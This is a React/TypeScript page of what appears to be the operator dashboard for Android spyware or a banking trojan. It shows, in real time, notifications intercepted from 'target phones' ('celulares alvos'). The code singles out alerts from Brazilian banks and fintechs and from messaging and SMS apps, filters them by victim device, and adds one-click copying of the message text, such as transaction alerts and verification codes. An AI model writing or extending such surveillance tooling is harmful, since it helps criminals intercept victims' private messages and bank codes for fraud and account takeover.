import { useState, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import { devicesAPI } from '../services/api';
import DashboardSidebar from '../components/dashboard/DashboardSidebar';
import {
  Bell,
  Search,
  RefreshCw,
  Copy,
  Check,
  Building2,
  MessageSquare,
  Smartphone,
  ArrowLeft
} from 'lucide-react';

interface NotificationItem {
  id: number;
  device_id: string;
  device_name: string;
  device_model: string;
  is_online: boolean;
  package: string;
  appName: string;
  app_name: string;
  title: string;
  text: string;
  timestamp: string;
  created_at: string;
}

interface NotificationsPageProps {
  onLogout: () => void;
}

// Helper para obter ícones, marca e cores exatas de cada aplicativo
function getAppBrandInfo(pkg: string = '', appName: string = '') {
  const p = (pkg + ' ' + appName).toLowerCase();

  if (p.includes('itau') || p.includes('itaú')) {
    return {
      name: 'Itaú',
      badgeBg: 'bg-orange-500/20 text-orange-300 border-orange-500/50',
      glow: 'shadow-[0_0_20px_rgba(236,112,0,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#EC7000] border border-orange-400/50 flex items-center justify-center text-white font-black text-xs font-mono shadow-md shrink-0">
          itau
        </div>
      )
    };
  }

  if (p.includes('nubank') || p.includes('nu.production')) {
    return {
      name: 'Nubank',
      badgeBg: 'bg-purple-500/20 text-purple-300 border-purple-500/50',
      glow: 'shadow-[0_0_20px_rgba(130,10,209,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#820AD1] border border-purple-400/50 flex items-center justify-center text-white font-black text-sm font-mono shadow-md shrink-0">
          nu
        </div>
      )
    };
  }

  if (p.includes('bradesco')) {
    return {
      name: 'Bradesco',
      badgeBg: 'bg-red-500/20 text-red-300 border-red-500/50',
      glow: 'shadow-[0_0_20px_rgba(204,9,47,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#CC092F] border border-red-400/50 flex items-center justify-center text-white font-black text-xs font-mono shadow-md shrink-0">
          BRA
        </div>
      )
    };
  }

  if (p.includes('santander')) {
    return {
      name: 'Santander',
      badgeBg: 'bg-red-500/20 text-red-300 border-red-500/50',
      glow: 'shadow-[0_0_20px_rgba(236,0,0,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#EC0000] border border-red-400/50 flex items-center justify-center text-white font-black text-[11px] font-mono shadow-md shrink-0">
          SAN
        </div>
      )
    };
  }

  if (p.includes('caixa')) {
    return {
      name: 'Caixa Tem',
      badgeBg: 'bg-blue-500/20 text-blue-300 border-blue-500/50',
      glow: 'shadow-[0_0_20px_rgba(0,92,169,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#005CA9] border border-blue-400/50 flex items-center justify-center text-[#F58220] font-black text-sm font-mono shadow-md shrink-0">
          X
        </div>
      )
    };
  }

  if (p.includes('bb') || p.includes('banco do brasil')) {
    return {
      name: 'Banco do Brasil',
      badgeBg: 'bg-yellow-500/20 text-yellow-300 border-yellow-500/50',
      glow: 'shadow-[0_0_20px_rgba(252,219,0,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#FCDB00] border border-yellow-400/50 flex items-center justify-center text-[#003882] font-black text-xs font-mono shadow-md shrink-0">
          BB
        </div>
      )
    };
  }

  if (p.includes('inter')) {
    return {
      name: 'Banco Inter',
      badgeBg: 'bg-orange-500/20 text-orange-300 border-orange-500/50',
      glow: 'shadow-[0_0_20px_rgba(255,122,0,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#FF7A00] border border-orange-400/50 flex items-center justify-center text-white font-black text-[10px] font-mono shadow-md shrink-0">
          inter
        </div>
      )
    };
  }

  if (p.includes('c6')) {
    return {
      name: 'C6 Bank',
      badgeBg: 'bg-slate-800 text-cyan-300 border-slate-600',
      glow: 'shadow-[0_0_20px_rgba(0,226,187,0.2)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#242424] border border-slate-600 flex items-center justify-center text-[#00E2BB] font-black text-xs font-mono shadow-md shrink-0">
          C6
        </div>
      )
    };
  }

  if (p.includes('mercadopago') || p.includes('mercado pago')) {
    return {
      name: 'Mercado Pago',
      badgeBg: 'bg-sky-500/20 text-sky-300 border-sky-500/50',
      glow: 'shadow-[0_0_20px_rgba(0,158,227,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#009EE3] border border-sky-400/50 flex items-center justify-center text-white font-black text-[10px] font-mono shadow-md shrink-0">
          MP
        </div>
      )
    };
  }

  if (p.includes('whatsapp')) {
    return {
      name: 'WhatsApp',
      badgeBg: 'bg-emerald-500/20 text-emerald-300 border-emerald-500/50',
      glow: 'shadow-[0_0_20px_rgba(37,211,102,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#25D366] border border-emerald-400/50 flex items-center justify-center text-white shadow-md shrink-0">
          <svg viewBox="0 0 24 24" className="w-6 h-6 fill-current">
            <path d="M12 2a10 10 0 0 0-8.5 15.3L2 22l4.8-1.5A10 10 0 1 0 12 2zm0 18a8 8 0 0 1-4.1-1.1l-.3-.2-3 .8.8-2.9-.2-.3A8 8 0 1 1 12 20z"/>
          </svg>
        </div>
      )
    };
  }

  if (p.includes('telegram')) {
    return {
      name: 'Telegram',
      badgeBg: 'bg-sky-500/20 text-sky-300 border-sky-500/50',
      glow: 'shadow-[0_0_20px_rgba(34,158,217,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#229ED9] border border-sky-400/50 flex items-center justify-center text-white shadow-md shrink-0">
          <svg viewBox="0 0 24 24" className="w-6 h-6 fill-current">
            <path d="M12 2A10 10 0 1 0 22 12 10 10 0 0 0 12 2zm4.8 6.8l-1.7 8.3c-.1.6-.5.7-1 .5l-2.6-1.9-1.3 1.2c-.1.1-.3.2-.5.2l.2-2.7 4.9-4.4c.2-.2 0-.3-.3-.1l-6 3.8-2.6-.8c-.6-.2-.6-.6.1-.9l10.2-4c.5-.2.9.1.7.8z"/>
          </svg>
        </div>
      )
    };
  }

  if (p.includes('gmail') || p.includes('google.android.gm')) {
    return {
      name: 'Gmail',
      badgeBg: 'bg-rose-500/20 text-rose-300 border-rose-500/50',
      glow: 'shadow-[0_0_20px_rgba(234,67,53,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#EA4335] border border-rose-400/50 flex items-center justify-center text-white shadow-md shrink-0">
          <svg viewBox="0 0 24 24" className="w-6 h-6 fill-current">
            <path d="M20 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
          </svg>
        </div>
      )
    };
  }

  if (p.includes('instagram')) {
    return {
      name: 'Instagram',
      badgeBg: 'bg-pink-500/20 text-pink-300 border-pink-500/50',
      glow: 'shadow-[0_0_20px_rgba(228,64,95,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-gradient-to-tr from-yellow-500 via-pink-600 to-purple-600 border border-pink-400/50 flex items-center justify-center text-white shadow-md shrink-0">
          <svg viewBox="0 0 24 24" className="w-6 h-6 fill-none stroke-current stroke-2">
            <rect x="2" y="2" width="20" height="20" rx="5"/>
            <path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"/>
            <line x1="17.5" y1="6.5" x2="17.51" y2="6.5"/>
          </svg>
        </div>
      )
    };
  }

  if (p.includes('pinterest')) {
    return {
      name: 'Pinterest',
      badgeBg: 'bg-red-500/20 text-red-300 border-red-500/50',
      glow: 'shadow-[0_0_20px_rgba(230,0,35,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#E60023] border border-red-400/50 flex items-center justify-center text-white font-black text-lg font-mono shadow-md shrink-0">
          P
        </div>
      )
    };
  }

  if (p.includes('sms') || p.includes('messaging') || p.includes('mms')) {
    return {
      name: 'SMS / Mensagens',
      badgeBg: 'bg-blue-500/20 text-blue-300 border-blue-500/50',
      glow: 'shadow-[0_0_20px_rgba(26,115,232,0.25)]',
      icon: (
        <div className="w-10 h-10 rounded-xl bg-[#1A73E8] border border-blue-400/50 flex items-center justify-center text-white shadow-md shrink-0">
          <MessageSquare className="w-5 h-5" />
        </div>
      )
    };
  }

  // Fallback padrão para outros apps
  const cleanName = appName || pkg.split('.').pop() || 'App';
  const initial = cleanName.charAt(0).toUpperCase();
  return {
    name: cleanName,
    badgeBg: 'bg-cyan-500/20 text-cyan-300 border-cyan-500/50',
    glow: 'shadow-[0_0_20px_rgba(6,182,212,0.15)]',
    icon: (
      <div className="w-10 h-10 rounded-xl bg-[#0b1d3a] border border-cyan-500/40 flex items-center justify-center text-cyan-300 font-black text-base font-mono shadow-md shrink-0">
        {initial}
      </div>
    )
  };
}

export default function NotificationsPage({ onLogout }: NotificationsPageProps) {
  const navigate = useNavigate();
  const [notifications, setNotifications] = useState<NotificationItem[]>([]);
  const [loading, setLoading] = useState<boolean>(true);
  const [copiedId, setCopiedId] = useState<number | null>(null);
  
  // Filtros
  const [selectedDevice, setSelectedDevice] = useState<string>('all');
  const [selectedCategory, setSelectedCategory] = useState<string>('all');
  const [searchTerm, setSearchTerm] = useState<string>('');
  const [autoRefresh, setAutoRefresh] = useState<boolean>(true);

  const fetchNotifications = useCallback(async () => {
    try {
      const data = await devicesAPI.getAllNotifications(300);
      setNotifications(data || []);
    } catch (err) {
      console.error('Erro ao carregar notificações:', err);
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchNotifications();
  }, [fetchNotifications]);

  // Auto Refresh a cada 5 segundos
  useEffect(() => {
    if (!autoRefresh) return;
    const interval = setInterval(() => {
      fetchNotifications();
    }, 5000);
    return () => clearInterval(interval);
  }, [autoRefresh, fetchNotifications]);

  const copyToClipboard = (text: string, id: number) => {
    navigator.clipboard.writeText(text);
    setCopiedId(id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  // Lista única de dispositivos capturados
  const uniqueDevices = Array.from(
    new Map(
      notifications.map(n => [n.device_id, { id: n.device_id, name: n.device_name, model: n.device_model }])
    ).values()
  );

  // Classificação por categoria
  const isBankApp = (pkg: string, app: string) => {
    const combined = (pkg + ' ' + app).toLowerCase();
    return combined.includes('itau') || combined.includes('bradesco') || combined.includes('nubank') ||
           combined.includes('caixa') || combined.includes('santander') || combined.includes('inter') ||
           combined.includes('c6') || combined.includes('sicredi') || combined.includes('pagbank') ||
           combined.includes('pagseguro') || combined.includes('mercadopago') || combined.includes('picpay');
  };

  const isMessageApp = (pkg: string, app: string) => {
    const combined = (pkg + ' ' + app).toLowerCase();
    return combined.includes('whatsapp') || combined.includes('telegram') || combined.includes('sms') ||
           combined.includes('mms') || combined.includes('messaging') || combined.includes('instagram');
  };

  // Filtragem dos itens
  const filteredNotifications = notifications.filter(n => {
    if (selectedDevice !== 'all' && n.device_id !== selectedDevice) {
      return false;
    }
    if (selectedCategory === 'banks' && !isBankApp(n.package, n.appName)) {
      return false;
    }
    if (selectedCategory === 'messages' && !isMessageApp(n.package, n.appName)) {
      return false;
    }
    if (selectedCategory === 'others' && (isBankApp(n.package, n.appName) || isMessageApp(n.package, n.appName))) {
      return false;
    }
    if (searchTerm.trim()) {
      const query = searchTerm.toLowerCase();
      const matchText = (n.text || '').toLowerCase();
      const matchTitle = (n.title || '').toLowerCase();
      const matchApp = (n.appName || '').toLowerCase();
      const matchPkg = (n.package || '').toLowerCase();
      const matchDev = (n.device_name || '').toLowerCase();
      return matchText.includes(query) || matchTitle.includes(query) ||
             matchApp.includes(query) || matchPkg.includes(query) || matchDev.includes(query);
    }

    return true;
  });

  // Estatísticas das Notificações
  const totalCount = notifications.length;
  const bankCount = notifications.filter(n => isBankApp(n.package, n.appName)).length;
  const messageCount = notifications.filter(n => isMessageApp(n.package, n.appName)).length;
  const deviceCount = uniqueDevices.length;

  return (
    <div className="flex h-screen bg-[#020714] text-slate-100 font-sans overflow-hidden">
      {/* Sidebar do Dashboard */}
      <DashboardSidebar onLogout={onLogout} />

      {/* Conteúdo Principal */}
      <div className="flex-1 flex flex-col h-full overflow-hidden relative">
        {/* Ambient Glow Cyberpunk */}
        <div className="absolute top-0 right-1/4 w-96 h-96 bg-cyan-500/5 rounded-full blur-3xl pointer-events-none" />

        {/* Header Superior */}
        <header className="bg-[#050c1e]/90 backdrop-blur-md border-b border-cyan-500/20 px-6 py-4 flex items-center justify-between z-10">
          <div className="flex items-center gap-3">
            <button
              onClick={() => navigate('/dashboard')}
              className="p-2 hover:bg-[#0f1f45] border border-cyan-500/30 rounded-xl text-cyan-400 transition-colors"
              title="Back to Dashboard"
            >
              <ArrowLeft className="w-4 h-4" />
            </button>
            <div>
              <h1 className="text-base font-black uppercase tracking-widest text-white font-mono flex items-center gap-2">
                <Bell className="w-5 h-5 text-cyan-400 animate-pulse" />
                Central de <span className="text-cyan-400">Notificações</span>
              </h1>
              <p className="text-[11px] text-slate-400 font-mono">
                Monitoramento em tempo real das notificações recebidas pelos celulares alvos
              </p>
            </div>
          </div>

          <div className="flex items-center gap-3">
            {/* Auto Refresh Toggle */}
            <button
              onClick={() => setAutoRefresh(!autoRefresh)}
              className={`px-3 py-1.5 rounded-xl border font-mono text-xs font-bold flex items-center gap-2 transition-all ${
                autoRefresh
                  ? 'bg-cyan-950/70 border-cyan-400 text-cyan-300 shadow-[0_0_15px_rgba(6,182,212,0.3)]'
                  : 'bg-[#070e22] border-slate-800 text-slate-500'
              }`}
            >
              <span className={`w-2 h-2 rounded-full ${autoRefresh ? 'bg-cyan-400 animate-ping' : 'bg-slate-600'}`} />
              <span>{autoRefresh ? 'Auto Sync (5s)' : 'Pausado'}</span>
            </button>

            {/* Recarregar Manual */}
            <button
              onClick={fetchNotifications}
              className="p-2 bg-[#091636] hover:bg-[#0f2457] border border-cyan-500/40 text-cyan-300 rounded-xl transition-all shadow-sm"
              title="Refresh Notifications"
            >
              <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin text-cyan-400' : ''}`} />
            </button>
          </div>
        </header>

        {/* Scrollable Container */}
        <main className="flex-1 overflow-y-auto p-4 sm:p-6 space-y-6">
          {/* Cards de Estatísticas */}
          <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 sm:gap-4">
            {/* Total */}
            <div className="bg-[#071126]/90 border border-cyan-500/30 rounded-2xl p-4 flex items-center gap-3.5 shadow-[0_0_20px_rgba(6,182,212,0.1)]">
              <div className="w-11 h-11 rounded-xl bg-cyan-950 border border-cyan-500/40 flex items-center justify-center text-cyan-400 shrink-0 shadow-inner">
                <Bell className="w-5 h-5" />
              </div>
              <div>
                <span className="text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono block">Total Notificações</span>
                <span className="text-2xl font-black text-white font-mono">{totalCount}</span>
              </div>
            </div>

            {/* Bancos */}
            <div className="bg-[#071126]/90 border border-amber-500/30 rounded-2xl p-4 flex items-center gap-3.5 shadow-[0_0_20px_rgba(245,158,11,0.1)]">
              <div className="w-11 h-11 rounded-xl bg-amber-950/60 border border-amber-500/40 flex items-center justify-center text-amber-400 shrink-0 shadow-inner">
                <Building2 className="w-5 h-5" />
              </div>
              <div>
                <span className="text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono block">Bancos & Fintechs</span>
                <span className="text-2xl font-black text-amber-300 font-mono">{bankCount}</span>
              </div>
            </div>

            {/* Mensagens & SMS */}
            <div className="bg-[#071126]/90 border border-emerald-500/30 rounded-2xl p-4 flex items-center gap-3.5 shadow-[0_0_20px_rgba(16,185,129,0.1)]">
              <div className="w-11 h-11 rounded-xl bg-emerald-950/60 border border-emerald-500/40 flex items-center justify-center text-emerald-400 shrink-0 shadow-inner">
                <MessageSquare className="w-5 h-5" />
              </div>
              <div>
                <span className="text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono block">Mensagens & SMS</span>
                <span className="text-2xl font-black text-emerald-300 font-mono">{messageCount}</span>
              </div>
            </div>

            {/* Active Devices */}
            <div className="bg-[#071126]/90 border border-blue-500/30 rounded-2xl p-4 flex items-center gap-3.5 shadow-[0_0_20px_rgba(59,130,246,0.1)]">
              <div className="w-11 h-11 rounded-xl bg-blue-950/60 border border-blue-500/40 flex items-center justify-center text-blue-400 shrink-0 shadow-inner">
                <Smartphone className="w-5 h-5" />
              </div>
              <div>
                <span className="text-[10px] font-black text-slate-400 uppercase tracking-wider font-mono block">Aparelhos Notificando</span>
                <span className="text-2xl font-black text-blue-300 font-mono">{deviceCount}</span>
              </div>
            </div>
          </div>

          {/* Barra de Filtros e Busca */}
          <div className="bg-[#061024]/90 border border-cyan-500/30 rounded-2xl p-4 space-y-3 sm:space-y-0 sm:flex sm:items-center sm:justify-between gap-4 shadow-md">
            {/* Campo de Busca */}
            <div className="relative flex-1">
              <Search className="w-4 h-4 text-cyan-400 absolute left-3.5 top-1/2 -translate-y-1/2" />
              <input
                type="text"
                value={searchTerm}
                onChange={(e) => setSearchTerm(e.target.value)}
                placeholder="Buscar em notificações (título, mensagem, app ou aparelho)..."
                className="w-full pl-10 pr-4 py-2.5 bg-[#040918] border border-cyan-500/30 rounded-xl text-xs font-mono text-cyan-100 placeholder-slate-500 focus:outline-none focus:border-cyan-400 focus:ring-1 focus:ring-cyan-400/40"
              />
              {searchTerm && (
                <button
                  onClick={() => setSearchTerm('')}
                  className="absolute right-3 top-1/2 -translate-y-1/2 text-xs text-slate-500 hover:text-slate-300 font-mono px-1.5 py-0.5 rounded bg-slate-800"
                >
                  Limpar
                </button>
              )}
            </div>

            {/* Dropdown Filtro por Dispositivo */}
            <div className="flex items-center gap-2">
              <select
                value={selectedDevice}
                onChange={(e) => setSelectedDevice(e.target.value)}
                className="px-3 py-2.5 bg-[#040918] border border-cyan-500/30 rounded-xl text-xs font-mono text-cyan-200 focus:outline-none focus:border-cyan-400 cursor-pointer"
              >
                <option value="all" className="bg-[#061024] text-white">📱 Todos os Aparelhos ({deviceCount})</option>
                {uniqueDevices.map(d => (
                  <option key={d.id} value={d.id} className="bg-[#061024] text-white">
                    {d.name} ({d.model})
                  </option>
                ))}
              </select>

              {/* Categorias */}
              <select
                value={selectedCategory}
                onChange={(e) => setSelectedCategory(e.target.value)}
                className="px-3 py-2.5 bg-[#040918] border border-cyan-500/30 rounded-xl text-xs font-mono text-cyan-200 focus:outline-none focus:border-cyan-400 cursor-pointer"
              >
                <option value="all" className="bg-[#061024] text-white">🏷️ Todas Categorias</option>
                <option value="banks" className="bg-[#061024] text-amber-300">🏦 Bancos & Fintechs</option>
                <option value="messages" className="bg-[#061024] text-emerald-300">💬 Mensagens & SMS</option>
                <option value="others" className="bg-[#061024] text-cyan-300">🌐 Outros Aplicativos</option>
              </select>
            </div>
          </div>

          {/* Lista de Cards Notificações Otimizados */}
          {loading && notifications.length === 0 ? (
            <div className="py-20 text-center space-y-3 font-mono text-xs text-slate-400">
              <RefreshCw className="w-8 h-8 text-cyan-400 animate-spin mx-auto" />
              <p>Carregando notificações dos dispositivos...</p>
            </div>
          ) : filteredNotifications.length === 0 ? (
            <div className="py-16 text-center border border-dashed border-cyan-500/20 rounded-2xl space-y-3 font-mono text-xs text-slate-400 bg-[#050c1d]/50">
              <Bell className="w-10 h-10 text-slate-600 mx-auto" />
              <p className="font-bold text-white text-sm">Nenhuma notificação encontrada com os filtros selecionados.</p>
              <p className="text-[11px] text-slate-500">
                As notificações recebidas nos aparelhos conectados aparecerão aqui automaticamente em tempo real!
              </p>
            </div>
          ) : (
            <div className="space-y-3.5">
              {filteredNotifications.map((n) => {
                const brandInfo = getAppBrandInfo(n.package, n.appName || n.app_name);
                const isBank = isBankApp(n.package, n.appName || n.app_name);
                const isMsg = isMessageApp(n.package, n.appName || n.app_name);

                return (
                  <div
                    key={n.id}
                    className={`bg-[#061024]/90 border rounded-2xl p-4 sm:p-4.5 transition-all duration-200 hover:scale-[1.003] group ${brandInfo.glow} ${
                      isBank
                        ? 'border-amber-500/40 bg-gradient-to-r from-amber-950/20 via-[#061024] to-[#061024]'
                        : isMsg
                        ? 'border-emerald-500/30 shadow-[0_0_15px_rgba(16,185,129,0.1)]'
                        : 'border-cyan-500/20 hover:border-cyan-400/50'
                    }`}
                  >
                    {/* Header do Card */}
                    <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 mb-3 pb-3 border-b border-cyan-500/15">
                      {/* Esquerda: Ícone + App Badge + Device + Package */}
                      <div className="flex items-center gap-3">
                        {/* Ícone de Marca do App */}
                        {brandInfo.icon}

                        <div className="space-y-1">
                          <div className="flex items-center gap-2 flex-wrap">
                            {/* App Name Badge */}
                            <span className={`px-2.5 py-0.5 rounded-lg text-xs font-black uppercase tracking-wider border font-mono ${brandInfo.badgeBg}`}>
                              {brandInfo.name}
                            </span>

                            {/* Aparelho Pill */}
                            <button
                              onClick={() => setSelectedDevice(n.device_id)}
                              className="px-2.5 py-0.5 rounded-lg bg-[#081533] border border-cyan-500/40 text-cyan-300 font-mono text-[11px] font-bold flex items-center gap-1.5 hover:border-cyan-400 transition-colors shadow-sm"
                              title="Filtrar notificações deste aparelho"
                            >
                              <span className={`w-2 h-2 rounded-full ${n.is_online ? 'bg-emerald-400 shadow-[0_0_6px_#10b981]' : 'bg-slate-500'}`} />
                              <Smartphone className="w-3 h-3 text-cyan-400" />
                              <span>{n.device_name}</span>
                              <span className="text-[10px] text-slate-400 font-normal">({n.device_model})</span>
                            </button>
                          </div>

                          {/* Pacote do aplicativo */}
                          <p className="text-[10.5px] font-mono text-slate-400/90 truncate max-w-[320px]">
                            {n.package}
                          </p>
                        </div>
                      </div>

                      {/* Direita: Timestamp & Botão Copiar */}
                      <div className="flex items-center gap-2.5 justify-between sm:justify-end shrink-0">
                        <span className="text-[11px] font-mono text-cyan-400/90 bg-[#040a18] px-2.5 py-1 rounded-xl border border-cyan-500/20">
                          ⏱️ {new Date(n.created_at || n.timestamp).toLocaleTimeString()} • {new Date(n.created_at || n.timestamp).toLocaleDateString()}
                        </span>

                        <button
                          onClick={() => copyToClipboard(`${n.title ? n.title + '\n' : ''}${n.text}`, n.id)}
                          className="px-3 py-1.5 bg-[#091838] hover:bg-[#0f2557] border border-cyan-500/40 text-cyan-300 hover:text-white rounded-xl font-mono text-[11px] font-bold flex items-center gap-1.5 transition-all active:scale-95 shadow-sm"
                          title="Copiar mensagem da notificação"
                        >
                          {copiedId === n.id ? (
                            <>
                              <Check className="w-3.5 h-3.5 text-emerald-400" />
                              <span className="text-emerald-400 font-black">Copiado!</span>
                            </>
                          ) : (
                            <>
                              <Copy className="w-3.5 h-3.5" />
                              <span>Copiar</span>
                            </>
                          )}
                        </button>
                      </div>
                    </div>

                    {/* Conteúdo da Notificação */}
                    <div className="space-y-1.5 pl-1">
                      {n.title && (
                        <h4 className="text-xs font-black text-white font-mono tracking-wide uppercase flex items-center gap-2">
                          <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 shadow-[0_0_6px_#22d3ee]"></span>
                          {n.title}
                        </h4>
                      )}
                      <div className="text-xs font-mono text-cyan-100 leading-relaxed bg-[#030816]/80 p-3.5 rounded-xl border border-cyan-500/20 break-words select-text shadow-inner">
                        {n.text || 'Sem texto de notificação'}
                      </div>
                    </div>
                  </div>
                );
              })}
            </div>
          )}
        </main>
      </div>
    </div>
  );
}
